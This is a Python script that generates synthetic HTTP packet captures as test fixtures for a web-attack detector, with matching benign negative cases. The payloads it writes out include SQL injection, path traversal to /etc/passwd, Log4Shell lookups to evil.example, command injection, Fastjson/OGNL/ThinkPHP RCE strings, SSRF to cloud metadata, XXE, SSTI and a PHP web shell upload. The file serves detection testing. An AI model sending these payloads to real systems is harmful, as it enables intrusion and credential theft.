#!/usr/bin/env python3
"""Generate deterministic HTTP PCAPs for the Web exploitation scenario.

Only used by tests; not part of detection. Requires scapy==2.6.1.
"""

from __future__ import annotations

import argparse
import os
from typing import Dict, List, Optional

from scapy.all import Ether, IP, Raw, TCP, wrpcap

BASE_TIME = 1700000000.0
EXTERNAL_IP = "203.0.113.9"
EXTERNAL_MAC = "02:00:00:00:00:09"
SERVER_IP = "10.0.0.80"
SERVER_MAC = "02:00:00:00:00:80"
HTTP_PORT = 80


def http_request(
    path: str,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    body: bytes = b"",
) -> bytes:
    lines = [
        "%s %s HTTP/1.1" % (method, path),
        "Host: app.example.test",
    ]
    for name, value in (headers or {}).items():
        lines.append("%s: %s" % (name, value))
    if body and not any(k.lower() == "content-length" for k in (headers or {})):
        lines.append("Content-Length: %d" % len(body))
    lines.append("Connection: close")
    return ("\r\n".join(lines) + "\r\n\r\n").encode("ascii") + body


def http_response(status: int = 200, body: bytes = b"") -> bytes:
    reasons = {200: "OK", 400: "Bad Request", 403: "Forbidden", 404: "Not Found", 500: "Internal Server Error"}
    reason = reasons.get(status, "Response")
    return (
        "HTTP/1.1 %d %s\r\n"
        "Content-Type: text/plain\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n"
        "\r\n" % (status, reason, len(body))
    ).encode("ascii") + body


def http_exchange(
    packets: List,
    sport: int,
    request: bytes,
    response: bytes,
    offset: float = 0.0,
) -> None:
    cseq = 1000
    sseq = 5000
    t0 = BASE_TIME + offset
    client_base = Ether(src=EXTERNAL_MAC, dst=SERVER_MAC) / IP(
        src=EXTERNAL_IP, dst=SERVER_IP
    )
    server_base = Ether(src=SERVER_MAC, dst=EXTERNAL_MAC) / IP(
        src=SERVER_IP, dst=EXTERNAL_IP
    )

    syn = client_base / TCP(sport=sport, dport=HTTP_PORT, flags="S", seq=cseq)
    syn.time = t0
    synack = server_base / TCP(
        sport=HTTP_PORT, dport=sport, flags="SA", seq=sseq, ack=cseq + 1
    )
    synack.time = t0 + 0.001
    ack = client_base / TCP(
        sport=sport, dport=HTTP_PORT, flags="A", seq=cseq + 1, ack=sseq + 1
    )
    ack.time = t0 + 0.002
    req = client_base / TCP(
        sport=sport, dport=HTTP_PORT, flags="PA", seq=cseq + 1, ack=sseq + 1
    ) / Raw(load=request)
    req.time = t0 + 0.003
    server_ack = server_base / TCP(
        sport=HTTP_PORT,
        dport=sport,
        flags="A",
        seq=sseq + 1,
        ack=cseq + 1 + len(request),
    )
    server_ack.time = t0 + 0.004
    resp = server_base / TCP(
        sport=HTTP_PORT,
        dport=sport,
        flags="PA",
        seq=sseq + 1,
        ack=cseq + 1 + len(request),
    ) / Raw(load=response)
    resp.time = t0 + 0.005
    client_ack = client_base / TCP(
        sport=sport,
        dport=HTTP_PORT,
        flags="A",
        seq=cseq + 1 + len(request),
        ack=sseq + 1 + len(response),
    )
    client_ack.time = t0 + 0.006

    packets.extend([syn, synack, ack, req, server_ack, resp, client_ack])


def add_case(
    packets: List,
    sport: int,
    path: str,
    method: str = "GET",
    headers: Optional[Dict[str, str]] = None,
    body: bytes = b"",
    status: int = 200,
    offset: float = 0.0,
) -> None:
    http_exchange(
        packets,
        sport,
        http_request(path, method, headers, body),
        http_response(status),
        offset,
    )


def write(name: str, packets: List, out_dir: str) -> None:
    wrpcap(os.path.join(out_dir, name + ".pcap"), packets)


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--out", default=os.path.join(os.path.dirname(__file__), "web_pcap")
    )
    args = parser.parse_args()
    os.makedirs(args.out, exist_ok=True)

    # --- SQL injection: URI, body, time, boolean, metadata, error ---
    p = []
    add_case(p, 40001, "/search?q=1%27%20UNION%20SELECT%201,2,3--")
    write("web_sqli_uri_union", p, args.out)

    p = []
    add_case(
        p,
        40002,
        "/login",
        "POST",
        {"Content-Type": "application/x-www-form-urlencoded"},
        b"username=admin%27+UNION+SELECT+1,2,3--&password=x",
    )
    write("web_sqli_body_union", p, args.out)

    p = []
    add_case(
        p,
        40003,
        "/item",
        "POST",
        {"Content-Type": "application/x-www-form-urlencoded"},
        b"id=1%3BSELECT+SLEEP%285%29",
    )
    write("web_sqli_time_body", p, args.out)

    p = []
    add_case(p, 40004, "/item?id=1%27+OR+%271%27%3D%271")
    write("web_sqli_boolean_uri", p, args.out)

    p = []
    add_case(
        p,
        40005,
        "/search?q=UNION+SELECT+table_name+FROM+information_schema.tables",
    )
    write("web_sqli_info_schema", p, args.out)

    p = []
    add_case(
        p,
        40006,
        "/item?id=extractvalue(1,concat(0x7e,version()))",
    )
    write("web_sqli_error", p, args.out)

    # --- Traversal / LFI: URI, encoded, body, wrapper ---
    p = []
    add_case(p, 40101, "/download?file=../../../../etc/passwd")
    write("web_traversal_uri", p, args.out)

    p = []
    add_case(p, 40102, "/download?file=..%2f..%2f..%2fetc%2fpasswd")
    write("web_traversal_encoded", p, args.out)

    p = []
    add_case(
        p,
        40103,
        "/download",
        "POST",
        {"Content-Type": "application/x-www-form-urlencoded"},
        b"file=..%2f..%2fetc%2fpasswd",
    )
    write("web_traversal_body", p, args.out)

    p = []
    add_case(
        p,
        40104,
        "/index.php?page=php://filter/convert.base64-encode/resource=index.php",
    )
    write("web_lfi_wrapper", p, args.out)

    # --- Log4Shell: header, nested header, body ---
    p = []
    add_case(p, 40201, "/", headers={"User-Agent": "${jndi:ldap://evil.example/a}"})
    write("web_log4shell_header", p, args.out)

    p = []
    add_case(
        p,
        40202,
        "/",
        headers={"X-Api-Version": "${${lower:j}ndi:ldap://evil.example/a}"},
    )
    write("web_log4shell_nested", p, args.out)

    p = []
    add_case(
        p,
        40203,
        "/api",
        "POST",
        {"Content-Type": "application/json"},
        b'{"x":"${jndi:rmi://evil.example/a}"}',
    )
    write("web_log4shell_body", p, args.out)

    # --- Command injection: URI and body ---
    p = []
    add_case(p, 40301, "/ping?x=127.0.0.1;id")
    write("web_cmdi_uri", p, args.out)

    p = []
    add_case(
        p,
        40302,
        "/ping",
        "POST",
        {"Content-Type": "application/x-www-form-urlencoded"},
        b"ip=127.0.0.1%7Cwhoami",
    )
    write("web_cmdi_body", p, args.out)

    # --- Deserialization / framework ---
    p = []
    add_case(
        p,
        40401,
        "/api",
        "POST",
        {"Content-Type": "application/json"},
        b'{"@type":"java.lang.Runtime","cmd":"id"}',
    )
    write("web_deser_fastjson", p, args.out)

    p = []
    add_case(
        p,
        40402,
        "/login",
        "POST",
        {"Content-Type": "application/x-www-form-urlencoded"},
        b"name=%25%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%29."
        b"%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D",
    )
    write("web_deser_ognl", p, args.out)

    p = []
    add_case(
        p,
        40403,
        "/index.php?s=index/think%5capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
    )
    write("web_deser_thinkphp", p, args.out)

    p = []
    add_case(
        p,
        40404,
        "/serial",
        "POST",
        {"Content-Type": "application/x-java-serialized-object"},
        b"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
    )
    write("web_deser_java", p, args.out)

    # --- SSRF ---
    p = []
    add_case(p, 40501, "/fetch?url=http://169.254.169.254/latest/meta-data/")
    write("web_ssrf_metadata", p, args.out)

    # --- XXE ---
    p = []
    add_case(
        p,
        40601,
        "/xml",
        "POST",
        {"Content-Type": "application/xml"},
        b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        b"<foo>&xxe;</foo>",
    )
    write("web_xxe", p, args.out)

    # --- SSTI ---
    p = []
    add_case(
        p,
        40701,
        "/hello?name=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%7D%7D",
    )
    write("web_ssti", p, args.out)

    # --- WebShell upload ---
    p = []
    boundary = "----WebKitFormBoundaryTest"
    upload_body = (
        ("--%s\r\n" % boundary).encode()
        + b'Content-Disposition: form-data; name="file"; filename="shell.php"\r\n'
        + b"Content-Type: application/x-php\r\n\r\n"
        + b"<?php system($_GET['c']); ?>\r\n"
        + ("--%s--\r\n" % boundary).encode()
    )
    add_case(
        p,
        40801,
        "/upload",
        "POST",
        {"Content-Type": "multipart/form-data; boundary=%s" % boundary},
        upload_body,
    )
    write("web_upload_webshell", p, args.out)

    # --- Negative cases ---
    p = []
    add_case(p, 41001, "/docs?q=information_schema")
    write("web_sqli_info_schema_negative", p, args.out)

    p = []
    add_case(p, 41002, "/files?path=../report.pdf")
    write("web_traversal_negative", p, args.out)

    p = []
    add_case(p, 41003, "/", headers={"X-Env": "${env:PATH}", "User-Agent": "Mozilla/5.0"})
    write("web_log4shell_negative", p, args.out)

    p = []
    add_case(p, 41004, "/api?a=1&id=2&cat=3")
    write("web_cmdi_negative", p, args.out)

    p = []
    add_case(
        p,
        41005,
        "/api",
        "POST",
        {"Content-Type": "application/json"},
        b'{"@type":"com.example.SafeDTO","id":1}',
    )
    write("web_deser_fastjson_negative", p, args.out)

    p = []
    add_case(p, 41006, "/docs?framework=ognl")
    write("web_deser_ognl_negative", p, args.out)

    p = []
    add_case(p, 41007, "/thinkphp/index.php")
    write("web_deser_thinkphp_negative", p, args.out)

    p = []
    add_case(p, 41008, "/fetch?url=https://example.com/")
    write("web_ssrf_negative", p, args.out)

    p = []
    add_case(
        p,
        41009,
        "/xml",
        "POST",
        {"Content-Type": "application/xml"},
        b'<?xml version="1.0"?><foo>bar</foo>',
    )
    write("web_xxe_negative", p, args.out)

    p = []
    add_case(p, 41010, "/hello?name=%7B%7Bname%7D%7D")
    write("web_ssti_negative", p, args.out)

    p = []
    boundary = "----WebKitFormBoundaryTest"
    benign_upload = (
        ("--%s\r\n" % boundary).encode()
        + b'Content-Disposition: form-data; name="file"; filename="report.pdf"\r\n'
        + b"Content-Type: application/pdf\r\n\r\n"
        + b"%PDF-1.4 test\r\n"
        + ("--%s--\r\n" % boundary).encode()
    )
    add_case(
        p,
        41011,
        "/upload",
        "POST",
        {"Content-Type": "multipart/form-data; boundary=%s" % boundary},
        benign_upload,
    )
    write("web_upload_negative", p, args.out)

    print("wrote Web PCAPs to", args.out)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
